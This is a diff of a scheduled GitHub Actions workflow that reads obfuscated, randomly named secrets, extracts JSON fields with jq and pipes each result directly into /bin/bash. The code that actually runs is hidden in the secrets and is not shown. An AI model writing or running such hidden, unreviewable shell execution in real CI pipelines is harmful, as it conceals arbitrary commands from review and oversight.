@@ -2,8 +2,7 @@ name: hantao19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 1/6 * * *'
-
+    - cron: '10 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,26 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: hantao19871010
         env:
-          vjv8: ${{ secrets.vjv8 }}
+          cfp3480: ${{ secrets.cfp3480 }}
         run: |
-          echo $vjv8 | jq -r .cu06000 | /bin/bash
-          echo $psmxt94584 | jq -r .yeyi6 | /bin/bash
-          echo $ihp90 | jq -r .cp13 | /bin/bash
-          echo $uy7 | jq -r .jm89 | /bin/bash
-          echo $pcm3720 | jq -r .o4107 | /bin/bash
-          echo $ci3494 | jq -r .cy15276 | /bin/bash
-          echo $fo221 | jq -r .m03803 | /bin/bash
-          echo $ym061 | jq -r .l98380 | /bin/bash
-          echo $cffy5618 | jq -r .inmv1790 | /bin/bash
-          echo $au8142 | jq -r .gj3 | /bin/bash
-          echo $pvp36716 | jq -r .q33 | /bin/bash
-          echo $gqtfg85 | jq -r .jhu17975 | /bin/bash
-          echo $iwv2 | jq -r .oqkb792 | /bin/bash
-          echo $sqava0 | jq -r .lwo67 | /bin/bash
-          echo $n80534 | jq -r .yz38 | /bin/bash
-          echo $uvl500 | jq -r .y722 | /bin/bash
-          echo $f36 | jq -r .vfk7051 | /bin/bash
-          echo $g2080 | jq -r .onqi43388 | /bin/bash
-          echo $txs065 | jq -r .k16205 | /bin/bash
-          echo $msuox8179 | jq -r .lnv63573 | /bin/bash
+          echo $cfp3480 | jq -r .vp7684 | /bin/bash
+          echo $bhvsz66 | jq -r .b21 | /bin/bash
+          echo $i53903 | jq -r .js30286 | /bin/bash
+          echo $zs58535 | jq -r .md2 | /bin/bash
+          echo $lyh628 | jq -r .fxd6 | /bin/bash
+          echo $r6750 | jq -r .mp61 | /bin/bash
+          echo $mfon48087 | jq -r .ltmwc84 | /bin/bash
+          echo $dfqr75 | jq -r .tdf2070 | /bin/bash
+          echo $svw7 | jq -r .hxdx65646 | /bin/bash
 
